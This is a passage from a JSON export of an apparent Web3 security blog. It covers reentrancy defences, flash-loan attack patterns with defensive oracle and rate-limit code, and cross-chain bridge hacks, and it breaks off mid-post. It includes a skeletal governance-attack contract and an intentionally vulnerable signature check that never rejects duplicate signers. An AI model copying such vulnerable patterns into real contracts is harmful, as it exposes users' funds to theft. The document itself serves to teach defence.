\u63d0\u4f9b\u4e86\u53ef\u91cd\u7528\u7684\u91cd\u5165\u4fdd\u62a4\u4fee\u9970\u7b26\uff1a\\n\\n```solidity\\nimport \\"@openzeppelin/contracts/security/ReentrancyGuard.sol\\";\\n\\ncontract SecureBank is ReentrancyGuard {\\n    mapping(address => uint256) public balances;\\n    \\n    function withdraw(uint256 amount) public nonReentrant {\\n        require(balances[msg.sender] >= amount, \\"Insufficient balance\\");\\n        balances[msg.sender] -= amount;\\n        \\n        (bool success, ) = msg.sender.call{value: amount}(\\"\\");\\n        require(success, \\"Transfer failed\\");\\n    }\\n}\\n```\\n\\n### 3. \u4f7f\u7528 Pull Payment \u6a21\u5f0f\\n\\n\u4e0d\u76f4\u63a5\u53d1\u9001\u8d44\u91d1\uff0c\u800c\u662f\u8ba9\u7528\u6237\u4e3b\u52a8\u63d0\u53d6\uff1a\\n\\n```solidity\\ncontract PullPaymentBank {\\n    mapping(address => uint256) public pendingWithdrawals;\\n    \\n    function withdraw() public {\\n        uint256 amount = pendingWithdrawals[msg.sender];\\n        require(amount > 0, \\"No pending withdrawal\\");\\n        \\n        pendingWithdrawals[msg.sender] = 0;\\n        \\n        (bool success, ) = msg.sender.call{value: amount}(\\"\\");\\n        require(success, \\"Transfer failed\\");\\n    }\\n}\\n```\\n\\n## \u771f\u5b9e\u6848\u4f8b\u5206\u6790\\n\\n### The DAO \u653b\u51fb\uff082016\uff09\\n\\n- **\u635f\u5931\u91d1\u989d**\uff1a360 \u4e07 ETH\uff08\u5f53\u65f6\u4ef7\u503c\u7ea6 6000 \u4e07\u7f8e\u5143\uff09\\n- **\u653b\u51fb\u539f\u7406**\uff1a\u5229\u7528 splitDAO \u51fd\u6570\u7684\u91cd\u5165\u6f0f\u6d1e\\n- **\u5f71\u54cd**\uff1a\u5bfc\u81f4\u4ee5\u592a\u574a\u786c\u5206\u53c9\uff0c\u8bde\u751f\u4e86 ETH \u548c ETC\\n\\n### Cream Finance \u653b\u51fb\uff082021\uff09\\n\\n- **\u635f\u5931\u91d1\u989d**\uff1a1.3 \u4ebf\u7f8e\u5143\\n- **\u653b\u51fb\u539f\u7406**\uff1a\u8de8\u534f\u8bae\u91cd\u5165\u653b\u51fb\\n- **\u6559\u8bad**\uff1a\u5373\u4f7f\u5355\u4e2a\u534f\u8bae\u5b89\u5168\uff0c\u534f\u8bae\u95f4\u7684\u7ec4\u5408\u4e5f\u53ef\u80fd\u4ea7\u751f\u6f0f\u6d1e\\n\\n## \u6700\u4f73\u5b9e\u8df5\u5efa\u8bae\\n\\n1. **\u59cb\u7ec8\u9075\u5faa CEI \u6a21\u5f0f**\uff1a\u5148\u68c0\u67e5\u3001\u518d\u66f4\u65b0\u72b6\u6001\u3001\u6700\u540e\u8fdb\u884c\u5916\u90e8\u4ea4\u4e92\\n2. **\u4f7f\u7528\u6210\u719f\u7684\u5b89\u5168\u5e93**\uff1a\u5982 OpenZeppelin \u7684 ReentrancyGuard\\n3. **\u9650\u5236 gas**\uff1a\u4f7f\u7528 `transfer()` \u6216 `send()` \u800c\u975e `call()`\uff08\u4f46\u8981\u6ce8\u610f gas \u9650\u5236\u95ee\u9898\uff09\\n4. **\u5168\u9762\u5ba1\u8ba1**\uff1a\u5728\u4e3b\u7f51\u90e8\u7f72\u524d\u8fdb\u884c\u4e13\u4e1a\u7684\u5b89\u5168\u5ba1\u8ba1\\n5. **\u6301\u7eed\u76d1\u63a7**\uff1a\u90e8\u7f72\u540e\u6301\u7eed\u76d1\u63a7\u5f02\u5e38\u4ea4\u6613\u6a21\u5f0f\\n\\n## \u68c0\u6d4b\u5de5\u5177\u63a8\u8350\\n\\n- **Slither**\uff1a\u9759\u6001\u5206\u6790\u5de5\u5177\uff0c\u53ef\u81ea\u52a8\u68c0\u6d4b\u91cd\u5165\u6f0f\u6d1e\\n- **Mythril**\uff1a\u7b26\u53f7\u6267\u884c\u5de5\u5177\uff0c\u6df1\u5ea6\u5206\u6790\u5408\u7ea6\u5b89\u5168\\n- **Echidna**\uff1a\u6a21\u7cca\u6d4b\u8bd5\u5de5\u5177\uff0c\u81ea\u52a8\u751f\u6210\u6d4b\u8bd5\u7528\u4f8b\\n- **Manticore**\uff1a\u52a8\u6001\u7b26\u53f7\u6267\u884c\u5f15\u64ce\\n\\n## \u603b\u7ed3\\n\\n\u91cd\u5165\u653b\u51fb\u867d\u7136\u662f\u4e00\u4e2a\u7ecf\u5178\u6f0f\u6d1e\uff0c\u4f46\u5728 DeFi \u751f\u6001\u7cfb\u7edf\u65e5\u76ca\u590d\u6742\u7684\u4eca\u5929\uff0c\u5b83\u4ecd\u7136\u662f\u4e00\u4e2a\u4e25\u91cd\u7684\u5a01\u80c1\u3002\u5f00\u53d1\u8005\u5fc5\u987b\uff1a\\n\\n- \u6df1\u5165\u7406\u89e3\u91cd\u5165\u653b\u51fb\u7684\u539f\u7406\\n- \u4e25\u683c\u9075\u5faa\u5b89\u5168\u7f16\u7801\u6a21\u5f0f\\n- \u4f7f\u7528\u81ea\u52a8\u5316\u5de5\u5177\u8f85\u52a9\u68c0\u6d4b\\n- \u8fdb\u884c\u5145\u5206\u7684\u6d4b\u8bd5\u548c\u5ba1\u8ba1\\n\\n\u53ea\u6709\u8fd9\u6837\uff0c\u624d\u80fd\u6784\u5efa\u771f\u6b63\u5b89\u5168\u53ef\u9760\u7684 Web3 \u5e94\u7528\u3002\\n\\n---\\n\\n**\u5173\u4e8e AutoSec**\\n\\nAutoSec \u81f4\u529b\u4e8e\u4e3a Web3 \u751f\u6001\u7cfb\u7edf\u63d0\u4f9b\u6700\u524d\u6cbf\u7684\u5b89\u5168\u7814\u7a76\u548c\u6f0f\u6d1e\u5206\u6790\u3002\u5173\u6ce8\u6211\u4eec\uff0c\u83b7\u53d6\u66f4\u591a\u667a\u80fd\u5408\u7ea6\u5b89\u5168\u77e5\u8bc6\u3002"},{"id":"defi-flash-loan-attacks","metadata":{"permalink":"/defi-flash-loan-attacks","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2025/02-04-defi-flash-loan-attacks.md","source":"@site/blog/2025/02-04-defi-flash-loan-attacks.md","title":"DeFi\u95ea\u7535\u8d37\u653b\u51fb\u6df1\u5ea6\u5256\u6790\uff1a\u539f\u7406\u3001\u6848\u4f8b\u4e0e\u9632\u5fa1","description":"\u95ea\u7535\u8d37\uff08Flash Loan\uff09\u662f DeFi \u9886\u57df\u7684\u521b\u65b0\u91d1\u878d\u5de5\u5177\uff0c\u4f46\u540c\u65f6\u4e5f\u6210\u4e3a\u4e86\u653b\u51fb\u8005\u6700\u559c\u7231\u7684\u6b66\u5668\u30022020-2023\u5e74\u95f4\uff0c\u57fa\u4e8e\u95ea\u7535\u8d37\u7684\u653b\u51fb\u9020\u6210\u4e86\u8d85\u8fc7 10 \u4ebf\u7f8e\u5143\u7684\u635f\u5931\u3002","date":"2025-02-04T00:00:00.000Z","tags":[{"inline":true,"label":"DeFi\u5b89\u5168","permalink":"/tags/de-fi\u5b89\u5168"},{"inline":true,"label":"\u95ea\u7535\u8d37","permalink":"/tags/\u95ea\u7535\u8d37"},{"inline":true,"label":"\u4ef7\u683c\u64cd\u7eb5","permalink":"/tags/\u4ef7\u683c\u64cd\u7eb5"},{"inline":true,"label":"\u5957\u5229\u653b\u51fb","permalink":"/tags/\u5957\u5229\u653b\u51fb"},{"inline":true,"label":"\u533a\u5757\u94fe\u5b89\u5168","permalink":"/tags/\u533a\u5757\u94fe\u5b89\u5168"}],"readingTime":4.87,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"defi-flash-loan-attacks","title":"DeFi\u95ea\u7535\u8d37\u653b\u51fb\u6df1\u5ea6\u5256\u6790\uff1a\u539f\u7406\u3001\u6848\u4f8b\u4e0e\u9632\u5fa1","authors":["autosec"],"tags":["DeFi\u5b89\u5168","\u95ea\u7535\u8d37","\u4ef7\u683c\u64cd\u7eb5","\u5957\u5229\u653b\u51fb","\u533a\u5757\u94fe\u5b89\u5168"]},"unlisted":false,"prevItem":{"title":"\u6df1\u5ea6\u89e3\u6790\uff1a\u91cd\u5165\u653b\u51fb\u53ca\u5176\u9632\u5fa1\u7b56\u7565","permalink":"/reentrancy-attack-analysis"},"nextItem":{"title":"Cross-Chain Bridge Security: Vulnerabilities and Best Practices","permalink":"/cross-chain-bridge-security"}},"content":"\u95ea\u7535\u8d37\uff08Flash Loan\uff09\u662f DeFi \u9886\u57df\u7684\u521b\u65b0\u91d1\u878d\u5de5\u5177\uff0c\u4f46\u540c\u65f6\u4e5f\u6210\u4e3a\u4e86\u653b\u51fb\u8005\u6700\u559c\u7231\u7684\u6b66\u5668\u30022020-2023\u5e74\u95f4\uff0c\u57fa\u4e8e\u95ea\u7535\u8d37\u7684\u653b\u51fb\u9020\u6210\u4e86\u8d85\u8fc7 10 \u4ebf\u7f8e\u5143\u7684\u635f\u5931\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \u95ea\u7535\u8d37\u57fa\u7840\\n\\n### \u4ec0\u4e48\u662f\u95ea\u7535\u8d37\uff1f\\n\\n\u95ea\u7535\u8d37\u662f\u4e00\u79cd\u65e0\u9700\u62b5\u62bc\u7684\u8d37\u6b3e\uff0c\u4f46\u5fc5\u987b\u5728\u540c\u4e00\u7b14\u4ea4\u6613\u4e2d\u501f\u5165\u548c\u5f52\u8fd8\u3002\u5982\u679c\u65e0\u6cd5\u5f52\u8fd8\uff0c\u6574\u4e2a\u4ea4\u6613\u4f1a\u56de\u6eda\u3002\\n\\n```solidity\\n// Aave \u95ea\u7535\u8d37\u793a\u4f8b\\ninterface IFlashLoanReceiver {\\n    function executeOperation(\\n        address[] calldata assets,\\n        uint256[] calldata amounts,\\n        uint256[] calldata premiums,\\n        address initiator,\\n        bytes calldata params\\n    ) external returns (bool);\\n}\\n\\ncontract FlashLoanExample is IFlashLoanReceiver {\\n    ILendingPool public lendingPool;\\n    \\n    function executeFlashLoan(address asset, uint256 amount) public {\\n        address[] memory assets = new address[](1);\\n        assets[0] = asset;\\n        \\n        uint256[] memory amounts = new uint256[](1);\\n        amounts[0] = amount;\\n        \\n        uint256[] memory modes = new uint256[](1);\\n        modes[0] = 0; // \u65e0\u503a\u52a1\u6a21\u5f0f\\n        \\n        lendingPool.flashLoan(\\n            address(this),\\n            assets,\\n            amounts,\\n            modes,\\n            address(this),\\n            \\"\\",\\n            0\\n        );\\n    }\\n    \\n    function executeOperation(\\n        address[] calldata assets,\\n        uint256[] calldata amounts,\\n        uint256[] calldata premiums,\\n        address initiator,\\n        bytes calldata params\\n    ) external override returns (bool) {\\n        // \u5728\u8fd9\u91cc\u6267\u884c\u5957\u5229\u6216\u653b\u51fb\u903b\u8f91\\n        \\n        // \u5fc5\u987b\u5f52\u8fd8\u8d37\u6b3e + \u624b\u7eed\u8d39\\n        uint256 amountOwing = amounts[0] + premiums[0];\\n        IERC20(assets[0]).approve(address(lendingPool), amountOwing);\\n        \\n        return true;\\n    }\\n}\\n```\\n\\n## \u5e38\u89c1\u653b\u51fb\u6a21\u5f0f\\n\\n### 1. \u4ef7\u683c\u64cd\u7eb5\u653b\u51fb\\n\\n\u653b\u51fb\u8005\u5229\u7528\u95ea\u7535\u8d37\u64cd\u7eb5 DEX \u4ef7\u683c\uff0c\u7136\u540e\u5728\u5176\u4ed6\u5e73\u53f0\u5957\u5229\u3002\\n\\n**\u653b\u51fb\u6d41\u7a0b\uff1a**\\n1. \u501f\u5165\u5927\u91cf\u4ee3\u5e01 A\\n2. \u5728 DEX1 \u5927\u91cf\u4e70\u5165\u4ee3\u5e01 B\uff0c\u63a8\u9ad8\u4ef7\u683c\\n3. \u5728\u4f7f\u7528 DEX1 \u4ef7\u683c\u7684\u534f\u8bae\u4e2d\uff0c\u7528\u9ad8\u4ef7\u7684 B \u4f5c\u4e3a\u62b5\u62bc\u501f\u51fa\u4ee3\u5e01 C\\n4. \u5728 DEX2 \u4ee5\u6b63\u5e38\u4ef7\u683c\u5356\u51fa B\\n5. \u5f52\u8fd8\u95ea\u7535\u8d37\uff0c\u83b7\u5229\\n\\n### 2. \u6cbb\u7406\u653b\u51fb\\n\\n\u5229\u7528\u95ea\u7535\u8d37\u4e34\u65f6\u83b7\u5f97\u5927\u91cf\u6cbb\u7406\u4ee3\u5e01\uff0c\u64cd\u7eb5\u6295\u7968\u3002\\n\\n```solidity\\n// \u6cbb\u7406\u653b\u51fb\u793a\u4f8b\\ncontract GovernanceAttack {\\n    function attack() external {\\n        // 1. \u95ea\u7535\u8d37\u501f\u5165\u6cbb\u7406\u4ee3\u5e01\\n        flashLoan(governanceToken, largeAmount);\\n        \\n        // 2. \u5728 executeOperation \u4e2d\uff1a\\n        //    - \u8d28\u62bc\u4ee3\u5e01\u83b7\u5f97\u6295\u7968\u6743\\n        //    - \u53d1\u8d77\u6076\u610f\u63d0\u6848\u5e76\u7acb\u5373\u6295\u7968\\n        //    - \u6267\u884c\u63d0\u6848\\n        //    - \u53d6\u6d88\u8d28\u62bc\\n        \\n        // 3. \u5f52\u8fd8\u95ea\u7535\u8d37\\n    }\\n}\\n```\\n\\n### 3. \u9884\u8a00\u673a\u64cd\u7eb5\\n\\n\u653b\u51fb\u4f9d\u8d56\u5355\u4e00 DEX \u4ef7\u683c\u7684\u9884\u8a00\u673a\u7cfb\u7edf\u3002\\n\\n## \u91cd\u5927\u653b\u51fb\u6848\u4f8b\\n\\n### bZx \u653b\u51fb\uff082020\u5e742\u6708\uff09\\n\\n**\u635f\u5931**\uff1a100 \u4e07\u7f8e\u5143\\n\\n**\u653b\u51fb\u6b65\u9aa4\uff1a**\\n1. \u4ece dYdX \u501f\u5165 10,000 ETH \u95ea\u7535\u8d37\\n2. \u5728 Compound \u5b58\u5165 5,500 ETH\\n3. \u7528\u5269\u4f59 ETH \u5728 bZx \u5f00 5 \u500d\u6760\u6746\u505a\u7a7a WBTC\\n4. bZx \u5728 Uniswap \u4e70\u5165\u5927\u91cf WBTC\uff0c\u63a8\u9ad8\u4ef7\u683c\\n5. \u5728 Uniswap \u4ee5\u9ad8\u4ef7\u5356\u51fa WBTC\\n6. \u5f52\u8fd8\u95ea\u7535\u8d37\uff0c\u83b7\u5229 35 \u4e07\u7f8e\u5143\\n\\n### PancakeBunny \u653b\u51fb\uff082021\u5e745\u6708\uff09\\n\\n**\u635f\u5931**\uff1a4500 \u4e07\u7f8e\u5143\\n\\n**\u653b\u51fb\u539f\u7406\uff1a**\\n- \u5229\u7528\u95ea\u7535\u8d37\u64cd\u7eb5 BUNNY/BNB \u4ef7\u683c\\n- \u89e6\u53d1\u534f\u8bae\u7684\u94f8\u5e01\u673a\u5236\\n- \u5927\u91cf\u94f8\u9020 BUNNY \u4ee3\u5e01\u5e76\u629b\u552e\\n- BUNNY \u4ef7\u683c\u66b4\u8dcc 96%\\n\\n### Cream Finance \u653b\u51fb\uff082021\u5e7410\u6708\uff09\\n\\n**\u635f\u5931**\uff1a1.3 \u4ebf\u7f8e\u5143\\n\\n**\u653b\u51fb\u624b\u6cd5\uff1a**\\n- \u8de8\u534f\u8bae\u91cd\u5165 + \u95ea\u7535\u8d37\\n- \u5229\u7528 yUSDVault \u7684\u4ef7\u683c\u8ba1\u7b97\u6f0f\u6d1e\\n- \u53cd\u590d\u501f\u8d37\u653e\u5927\u653b\u51fb\u6548\u679c\\n\\n## \u9632\u5fa1\u7b56\u7565\\n\\n### 1. \u4f7f\u7528\u65f6\u95f4\u52a0\u6743\u5e73\u5747\u4ef7\u683c\uff08TWAP\uff09\\n\\n```solidity\\n// Uniswap V2 TWAP \u9884\u8a00\u673a\\ncontract TWAPOracle {\\n    uint256 public price0CumulativeLast;\\n    uint256 public price1CumulativeLast;\\n    uint32 public blockTimestampLast;\\n    \\n    function update() external {\\n        (\\n            uint256 price0Cumulative,\\n            uint256 price1Cumulative,\\n            uint32 blockTimestamp\\n        ) = UniswapV2OracleLibrary.currentCumulativePrices(pair);\\n        \\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast;\\n        \\n        if (timeElapsed > PERIOD) {\\n            // \u8ba1\u7b97\u65f6\u95f4\u52a0\u6743\u5e73\u5747\u4ef7\u683c\\n            price0Average = (price0Cumulative - price0CumulativeLast) / timeElapsed;\\n            price1Average = (price1Cumulative - price1CumulativeLast) / timeElapsed;\\n            \\n            price0CumulativeLast = price0Cumulative;\\n            price1CumulativeLast = price1Cumulative;\\n            blockTimestampLast = blockTimestamp;\\n        }\\n    }\\n}\\n```\\n\\n### 2. \u4f7f\u7528\u591a\u4e2a\u4ef7\u683c\u6e90\\n\\n```solidity\\ncontract MultiSourceOracle {\\n    function getPrice() public view returns (uint256) {\\n        uint256 chainlinkPrice = getChainlinkPrice();\\n        uint256 uniswapPrice = getUniswapTWAP();\\n        uint256 curvePrice = getCurvePrice();\\n        \\n        // \u53d6\u4e2d\u4f4d\u6570\u6216\u52a0\u6743\u5e73\u5747\\n        return median(chainlinkPrice, uniswapPrice, curvePrice);\\n    }\\n}\\n```\\n\\n### 3. \u5b9e\u65bd\u4ea4\u6613\u9650\u5236\\n\\n```solidity\\ncontract ProtectedProtocol {\\n    mapping(address => uint256) public lastActionBlock;\\n    \\n    modifier oneBlockDelay() {\\n        require(\\n            block.number > lastActionBlock[msg.sender],\\n            \\"Action too frequent\\"\\n        );\\n        lastActionBlock[msg.sender] = block.number;\\n        _;\\n    }\\n    \\n    function deposit() external oneBlockDelay {\\n        // \u5b58\u6b3e\u903b\u8f91\\n    }\\n    \\n    function withdraw() external oneBlockDelay {\\n        // \u63d0\u6b3e\u903b\u8f91\\n    }\\n}\\n```\\n\\n### 4. \u6d41\u52a8\u6027\u68c0\u67e5\\n\\n```solidity\\nfunction checkLiquidity(address token, uint256 amount) internal view {\\n    uint256 poolLiquidity = getPoolLiquidity(token);\\n    require(\\n        amount <= poolLiquidity * MAX_TRADE_PERCENTAGE / 100,\\n        \\"Trade too large\\"\\n    );\\n}\\n```\\n\\n## \u6700\u4f73\u5b9e\u8df5\\n\\n### \u534f\u8bae\u8bbe\u8ba1\u5c42\u9762\\n\\n1. **\u907f\u514d\u4f9d\u8d56\u5355\u4e00\u4ef7\u683c\u6e90**\\n2. **\u5b9e\u65bd\u6ed1\u70b9\u4fdd\u62a4**\\n3. **\u8bbe\u7f6e\u4ea4\u6613\u89c4\u6a21\u4e0a\u9650**\\n4. **\u4f7f\u7528 TWAP \u800c\u975e\u5373\u65f6\u4ef7\u683c**\\n5. **\u5b9e\u65bd\u591a\u7b7e\u6cbb\u7406\uff0c\u589e\u52a0\u65f6\u95f4\u9501**\\n\\n### \u4ee3\u7801\u5b9e\u73b0\u5c42\u9762\\n\\n```solidity\\n// \u7efc\u5408\u9632\u62a4\u793a\u4f8b\\ncontract SecureDeFiProtocol {\\n    using SafeMath for uint256;\\n    \\n    // \u4ef7\u683c\u504f\u5dee\u9608\u503c\\n    uint256 constant MAX_PRICE_DEVIATION = 5; // 5%\\n    \\n    // \u5355\u7b14\u4ea4\u6613\u4e0a\u9650\\n    uint256 constant MAX_TRADE_SIZE = 1000000 * 1e18;\\n    \\n    function swap(\\n        address tokenIn,\\n        address tokenOut,\\n        uint256 amountIn\\n    ) external {\\n        // 1. \u68c0\u67e5\u4ea4\u6613\u89c4\u6a21\\n        require(amountIn <= MAX_TRADE_SIZE, \\"Trade too large\\");\\n        \\n        // 2. \u83b7\u53d6\u591a\u4e2a\u4ef7\u683c\u6e90\\n        uint256 twapPrice = getTWAPPrice(tokenIn, tokenOut);\\n        uint256 spotPrice = getSpotPrice(tokenIn, tokenOut);\\n        uint256 chainlinkPrice = getChainlinkPrice(tokenIn, tokenOut);\\n        \\n        // 3. \u9a8c\u8bc1\u4ef7\u683c\u504f\u5dee\\n        require(\\n            isPriceValid(twapPrice, spotPrice, chainlinkPrice),\\n            \\"Price manipulation detected\\"\\n        );\\n        \\n        // 4. \u6267\u884c\u4ea4\u6613\\n        _executeSwap(tokenIn, tokenOut, amountIn);\\n    }\\n    \\n    function isPriceValid(\\n        uint256 price1,\\n        uint256 price2,\\n        uint256 price3\\n    ) internal pure returns (bool) {\\n        uint256 avgPrice = (price1 + price2 + price3) / 3;\\n        \\n        return (\\n            isWithinDeviation(price1, avgPrice) &&\\n            isWithinDeviation(price2, avgPrice) &&\\n            isWithinDeviation(price3, avgPrice)\\n        );\\n    }\\n    \\n    function isWithinDeviation(\\n        uint256 price,\\n        uint256 reference\\n    ) internal pure returns (bool) {\\n        uint256 deviation = price > reference\\n            ? (price - reference) * 100 / reference\\n            : (reference - price) * 100 / reference;\\n            \\n        return deviation <= MAX_PRICE_DEVIATION;\\n    }\\n}\\n```\\n\\n## \u76d1\u63a7\u4e0e\u54cd\u5e94\\n\\n### \u5b9e\u65f6\u76d1\u63a7\u6307\u6807\\n\\n1. **\u5f02\u5e38\u4ea4\u6613\u91cf**\uff1a\u5355\u7b14\u4ea4\u6613\u8d85\u8fc7\u6c60\u5b50\u6d41\u52a8\u6027\u7684 10%\\n2. **\u4ef7\u683c\u5267\u70c8\u6ce2\u52a8**\uff1a\u77ed\u65f6\u95f4\u5185\u4ef7\u683c\u53d8\u5316\u8d85\u8fc7 5%\\n3. **\u5feb\u901f\u501f\u8d37**\uff1a\u540c\u4e00\u5730\u5740\u5728\u4e00\u4e2a\u533a\u5757\u5185\u591a\u6b21\u501f\u8d37\\n4. **\u6cbb\u7406\u5f02\u5e38**\uff1a\u7a81\u7136\u51fa\u73b0\u7684\u5927\u989d\u6295\u7968\\n\\n### \u5e94\u6025\u54cd\u5e94\u673a\u5236\\n\\n```solidity\\ncontract EmergencyProtection {\\n    address public guardian;\\n    bool public paused;\\n    \\n    modifier whenNotPaused() {\\n        require(!paused, \\"Protocol paused\\");\\n        _;\\n    }\\n    \\n    function pause() external {\\n        require(msg.sender == guardian, \\"Not guardian\\");\\n        paused = true;\\n        emit Paused(block.timestamp);\\n    }\\n    \\n    function unpause() external {\\n        require(msg.sender == guardian, \\"Not guardian\\");\\n        paused = false;\\n        emit Unpaused(block.timestamp);\\n    }\\n}\\n```\\n\\n## \u603b\u7ed3\\n\\n\u95ea\u7535\u8d37\u653b\u51fb\u662f DeFi \u5b89\u5168\u7684\u91cd\u5927\u6311\u6218\uff0c\u4f46\u901a\u8fc7\uff1a\\n\\n- \ud83d\udd0d **\u5ba1\u614e\u7684\u534f\u8bae\u8bbe\u8ba1**\\n- \ud83d\udee1\ufe0f **\u591a\u5c42\u9632\u5fa1\u673a\u5236**\\n- \ud83d\udcca **\u5b9e\u65f6\u76d1\u63a7\u7cfb\u7edf**\\n- \u26a1 **\u5feb\u901f\u54cd\u5e94\u80fd\u529b**\\n\\n\u6211\u4eec\u53ef\u4ee5\u5927\u5927\u964d\u4f4e\u653b\u51fb\u98ce\u9669\u3002\u8bb0\u4f4f\uff1a**\u5b89\u5168\u4e0d\u662f\u4e00\u6b21\u6027\u7684\u5de5\u4f5c\uff0c\u800c\u662f\u6301\u7eed\u7684\u8fc7\u7a0b**\u3002\\n\\n---\\n\\n**AutoSec \u63d0\u793a**\uff1a\u5728\u90e8\u7f72\u4efb\u4f55 DeFi \u534f\u8bae\u524d\uff0c\u52a1\u5fc5\u8fdb\u884c\u5168\u9762\u7684\u5b89\u5168\u5ba1\u8ba1\u548c\u538b\u529b\u6d4b\u8bd5\u3002"},{"id":"cross-chain-bridge-security","metadata":{"permalink":"/cross-chain-bridge-security","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2025/02-03-cross-chain-bridge-security.md","source":"@site/blog/2025/02-03-cross-chain-bridge-security.md","title":"Cross-Chain Bridge Security: Vulnerabilities and Best Practices","description":"Cross-chain bridges have become critical infrastructure in the Web3 ecosystem, enabling asset transfers between different blockchains. However, they\'ve also become prime targets for attackers, with over $2 billion stolen in bridge hacks during 2022 alone.","date":"2025-02-03T00:00:00.000Z","tags":[{"inline":true,"label":"cross-chain","permalink":"/tags/cross-chain"},{"inline":true,"label":"bridge security","permalink":"/tags/bridge-security"},{"inline":true,"label":"blockchain","permalink":"/tags/blockchain"},{"inline":true,"label":"Web3 security","permalink":"/tags/web-3-security"},{"inline":true,"label":"vulnerability analysis","permalink":"/tags/vulnerability-analysis"}],"readingTime":5.82,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"cross-chain-bridge-security","title":"Cross-Chain Bridge Security: Vulnerabilities and Best Practices","authors":["autosec"],"tags":["cross-chain","bridge security","blockchain","Web3 security","vulnerability analysis"]},"unlisted":false,"prevItem":{"title":"DeFi\u95ea\u7535\u8d37\u653b\u51fb\u6df1\u5ea6\u5256\u6790\uff1a\u539f\u7406\u3001\u6848\u4f8b\u4e0e\u9632\u5fa1","permalink":"/defi-flash-loan-attacks"},"nextItem":{"title":"NFT\u667a\u80fd\u5408\u7ea6\u5b89\u5168\u6f0f\u6d1e\u5168\u89e3\u6790","permalink":"/nft-security-vulnerabilities"}},"content":"Cross-chain bridges have become critical infrastructure in the Web3 ecosystem, enabling asset transfers between different blockchains. However, they\'ve also become prime targets for attackers, with over $2 billion stolen in bridge hacks during 2022 alone.\\n\\n\x3c!--truncate--\x3e\\n\\n## Understanding Cross-Chain Bridges\\n\\n### What Are Cross-Chain Bridges?\\n\\nCross-chain bridges are protocols that enable the transfer of assets and data between different blockchain networks. They solve the interoperability problem but introduce new security challenges.\\n\\n### Common Bridge Architectures\\n\\n#### 1. Lock and Mint\\n\\n```solidity\\n// Simplified Lock and Mint Bridge\\ncontract LockAndMintBridge {\\n    mapping(bytes32 => bool) public processedTransactions;\\n    \\n    event TokensLocked(\\n        address indexed user,\\n        uint256 amount,\\n        uint256 targetChain,\\n        bytes32 txHash\\n    );\\n    \\n    event TokensMinted(\\n        address indexed user,\\n        uint256 amount,\\n        bytes32 sourceTxHash\\n    );\\n    \\n    // Lock tokens on source chain\\n    function lockTokens(\\n        uint256 amount,\\n        uint256 targetChain\\n    ) external {\\n        require(amount > 0, \\"Amount must be positive\\");\\n        \\n        // Transfer tokens to bridge contract\\n        token.transferFrom(msg.sender, address(this), amount);\\n        \\n        bytes32 txHash = keccak256(\\n            abi.encodePacked(\\n                msg.sender,\\n                amount,\\n                targetChain,\\n                block.timestamp\\n            )\\n        );\\n        \\n        emit TokensLocked(msg.sender, amount, targetChain, txHash);\\n    }\\n    \\n    // Mint wrapped tokens on target chain\\n    function mintTokens(\\n        address user,\\n        uint256 amount,\\n        bytes32 sourceTxHash,\\n        bytes[] memory signatures\\n    ) external {\\n        require(!processedTransactions[sourceTxHash], \\"Already processed\\");\\n        require(verifySignatures(signatures, sourceTxHash), \\"Invalid signatures\\");\\n        \\n        processedTransactions[sourceTxHash] = true;\\n        wrappedToken.mint(user, amount);\\n        \\n        emit TokensMinted(user, amount, sourceTxHash);\\n    }\\n}\\n```\\n\\n#### 2. Liquidity Pools\\n\\n```solidity\\ncontract LiquidityPoolBridge {\\n    mapping(address => uint256) public liquidity;\\n    \\n    function addLiquidity(uint256 amount) external {\\n        token.transferFrom(msg.sender, address(this), amount);\\n        liquidity[msg.sender] += amount;\\n    }\\n    \\n    function swap(\\n        uint256 amount,\\n        uint256 targetChain\\n    ) external {\\n        require(\\n            token.balanceOf(address(this)) >= amount,\\n            \\"Insufficient liquidity\\"\\n        );\\n        \\n        token.transferFrom(msg.sender, address(this), amount);\\n        \\n        // Emit event for relayers to process on target chain\\n        emit SwapInitiated(msg.sender, amount, targetChain);\\n    }\\n}\\n```\\n\\n## Major Bridge Hacks\\n\\n### Ronin Bridge Hack (March 2022)\\n\\n**Loss**: $625 million\\n\\n**Attack Vector**:\\n- Compromised 5 out of 9 validator private keys\\n- Attacker gained control of the multi-sig wallet\\n- Withdrew 173,600 ETH and 25.5M USDC\\n\\n**Root Cause**:\\n```solidity\\n// Vulnerable multi-sig configuration\\ncontract VulnerableMultiSig {\\n    uint256 public constant REQUIRED_SIGNATURES = 5;\\n    uint256 public constant TOTAL_VALIDATORS = 9;\\n    \\n    // Problem: Too few validators controlled by same entity\\n    // 4 validators controlled by Sky Mavis\\n    // 1 validator was Axie DAO (compromised via social engineering)\\n}\\n```\\n\\n### Wormhole Bridge Hack (February 2022)\\n\\n**Loss**: $325 million\\n\\n**Attack Vector**:\\n- Exploited signature verification vulnerability\\n- Forged guardian signatures\\n- Minted 120,000 wrapped ETH without locking real ETH\\n\\n**Vulnerable Code Pattern**:\\n```solidity\\n// Simplified vulnerable signature verification\\nfunction verifySignatures(\\n    bytes32 hash,\\n    bytes[] memory signatures\\n) internal view returns (bool) {\\n    uint256 validSignatures = 0;\\n    \\n    for (uint256 i = 0; i < signatures.length; i++) {\\n        address signer = recoverSigner(hash, signatures[i]);\\n        \\n        // Vulnerability: No check for duplicate signers\\n        if (isGuardian(signer)) {\\n            validSignatures++;\\n        }\\n    }\\n    \\n    return validSignatures >= REQUIRED_SIGNATURES;\\n}\\n```\\n\\n### Poly Network Hack (August 2021)\\n\\n**Loss**: $611 million (later returned)\\n\\n**Attack Vector**:\\n- Exploited privilege escalation vulnerability\\n- Called privileged function `EthCrossChainManager`\\n- Modified keeper addresses to attacker\'s address\\n\\n## Common Vulnerabilities\\n\\n### 1. Signature Verification Issues\\n\\n```solidity\\n// Secure signature verification\\ncontract SecureSignatureVerification {\\n    mapping(address => bool) public usedSigners;\\n    \\n    function verifySignatures(\\n        bytes32 hash,\\n        bytes[] memory signatures\\n    ) internal returns (bool) {\\n        require(signatures.length >= 